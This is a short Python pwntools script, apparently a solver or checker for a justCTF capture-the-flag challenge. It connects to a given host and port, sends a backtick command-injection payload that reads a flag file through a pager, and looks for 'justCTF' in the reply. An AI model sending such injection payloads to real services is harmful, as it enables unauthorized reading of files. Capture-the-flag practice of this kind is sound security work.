from pwn import connect
import sys

con = connect(sys.argv[1], int(sys.argv[2]))
con.sendline("`pager flag`")

if con.recvuntil('justCTF', timeout=1):
  print('ok')
else:
  print('error')
